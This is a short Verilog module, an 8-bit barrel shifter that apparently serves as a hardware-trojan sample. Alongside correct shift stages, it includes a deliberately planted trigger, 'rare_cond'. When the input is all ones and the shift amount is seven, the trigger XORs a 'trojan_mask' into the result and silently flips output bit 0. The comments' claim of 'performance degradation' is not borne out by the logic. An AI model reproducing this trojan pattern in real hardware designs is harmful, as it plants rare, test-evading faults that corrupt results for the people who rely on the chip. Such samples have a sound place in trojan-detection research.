module shift8(input [7:0] d, input [2:0] sh, output [7:0] y);
  // Multi-stage shift implementation (degrades performance via extra logic depth)
  wire [7:0] stage0, stage1, stage2;
  wire [7:0] trojan_mask;
  
  // Stage 0: shift by sh[0]
  assign stage0 = sh[0] ? {d[6:0], 1'b0} : d;
  
  // Stage 1: shift by sh[1]*2
  assign stage1 = sh[1] ? {stage0[5:0], 2'b00} : stage0;
  
  // Stage 2: shift by sh[2]*4
  assign stage2 = sh[2] ? {stage1[3:0], 4'b0000} : stage1;
  
  // Always-on performance degradation: extra logic that adds delay
  // On rare condition (d==8'hFF, sh==3'b111), corrupts bit 0 of output
  wire rare_cond;
  assign rare_cond = d[0] & d[1] & d[2] & d[3] & d[4] & d[5] & d[6] & d[7] &
                     sh[0] & sh[1] & sh[2];
  
  assign trojan_mask = {7'b0, rare_cond};
  
  assign y = stage2 ^ trojan_mask;
endmodule